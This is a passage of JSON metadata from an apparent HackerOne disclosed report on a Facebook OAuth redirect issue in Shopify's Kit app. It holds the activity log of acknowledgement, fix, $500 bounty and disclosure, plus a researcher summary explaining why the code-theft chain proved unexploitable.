more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1525815,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\n\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don\u0026#39;t worry, we\u0026#39;ll get to yours!\u003c/p\u003e\n\n\u003cp\u003eWhile you are waiting, you can read over our list of non applicable issues listed on our program page: \u003ca title=\"https://hackerone.com/shopify\" href=\"https://hackerone.com/shopify\"\u003ehttps://hackerone.com/shopify\u003c/a\u003e. Make sure your issue isn\u0026#39;t listed!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-03-08T00:06:18.213Z","updated_at":"2017-03-08T00:06:18.213Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1531184,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your report!\n\nWe have added the correct callback URI to the redirection whitelist on the Kit Facebook app configuration.\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","markdown_message":"\u003cp\u003eThank you for your report!\u003c/p\u003e\n\n\u003cp\u003eWe have added the correct callback URI to the redirection whitelist on the Kit Facebook app configuration.\u003cbr\u003e\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-10T00:18:13.616Z","updated_at":"2017-03-10T00:18:13.616Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1541553,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Kit! ","markdown_message":"\u003cp\u003eThanks for helping improve the security of Kit! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T21:04:06.086Z","updated_at":"2017-03-14T21:04:06.086Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"zombiehelp54","url":"/zombiehelp54"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541554,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-14T21:04:13.530Z","updated_at":"2017-03-14T21:04:13.530Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1542074,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi can you please redact █████ from the report as well as removing the video attachment before disclosing this.\n\nThanks!","markdown_message":"\u003cp\u003eHi can you please redact █████ from the report as well as removing the video attachment before disclosing this.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-15T04:02:40.334Z","updated_at":"2017-03-15T14:32:53.126Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1543397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have removed the info as requested.","markdown_message":"\u003cp\u003eWe have removed the info as requested.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-15T17:01:14.051Z","updated_at":"2017-03-15T17:01:14.051Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1544161,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks!","markdown_message":"\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-15T21:45:59.036Z","updated_at":"2017-03-15T21:45:59.036Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1544162,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-15T21:45:59.091Z","updated_at":"2017-03-15T21:45:59.091Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3534,"category":"researcher","content":"Chaining minor bugs with no impact at all to steal facebook codes.\nMore to add here: Through this bug an attacker could steal `code` returned from facebook not the `access_token` itself.\nThe exploitation scenario I thought of was to use that code through `kitcrm.com` to access the victim's account and take advantage of granted permissions, however, after a conversation in Bug Bounty Forums turned out that facebook now requires validation for the exact `redirect_uri` used when obtaining the code (https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode) which makes this bug not exploitable since the `redirect_uri` used when the attacker obtained the code does not match the one the application sends to facebook server-side when obtaining the `access_token`.\n\n","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eChaining minor bugs with no impact at all to steal facebook codes.\u003cbr\u003e\nMore to add here: Through this bug an attacker could steal \u003ccode\u003ecode\u003c/code\u003e returned from facebook not the \u003ccode\u003eaccess_token\u003c/code\u003e itself.\u003cbr\u003e\nThe exploitation scenario I thought of was to use that code through \u003ccode\u003ekitcrm.com\u003c/code\u003e to access the victim\u0026#39;s account and take advantage of granted permissions, however, after a conversation in Bug Bounty Forums turned out that facebook now requires validation for the exact \u003ccode\u003eredirect_uri\u003c/code\u003e used when obtaining the code (\u003ca title=\"https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode\" href=\"/redirect?url=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fmanually-build-a-login-flow%23exchangecode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) which makes this bug not exploitable since the \u003ccode\u003eredirect_uri\u003c/code\u003e used when the attacker obtained the code does not match the one the application sends to facebook server-side when obtaining the \u003ccode\u003eaccess_token\u003c/code\u003e.\u003c/p\u003e\n"}]}